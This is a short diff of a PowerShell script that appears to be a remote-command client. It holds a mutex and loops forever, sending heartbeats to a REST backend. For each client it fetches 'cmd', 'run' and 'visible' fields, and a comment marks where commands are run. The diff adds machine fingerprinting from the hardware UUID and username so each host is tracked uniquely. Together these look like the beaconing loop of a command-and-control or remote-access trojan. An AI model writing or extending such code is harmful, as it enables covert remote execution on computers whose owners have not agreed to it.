@@ -5,6 +5,9 @@ if (-not $mutex.WaitOne(0)) { exit }
 $BASE_URL = ""
 $API_KEY = ""
 
+$uuid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
+$uniqueUser = "$($env:USERNAME)-$($uuid.Split('-')[-1])"
+
 $h = @{
     "apikey"        = $API_KEY
     "Authorization" = "Bearer $API_KEY"
@@ -17,7 +20,7 @@ try {
     while ($true) {
         try {
             # heartbeat
-            $u = "$BASE_URL/clients?username=eq.$env:USERNAME&select=cmd,run,visible"
+            $u = "$BASE_URL/clients?username=eq.$uniqueUser&select=cmd,run,visible"
             $r = Invoke-RestMethod -Method Patch -Uri $u -Headers $h -Body '{"updated_at": "now()"}'
         
             # run command
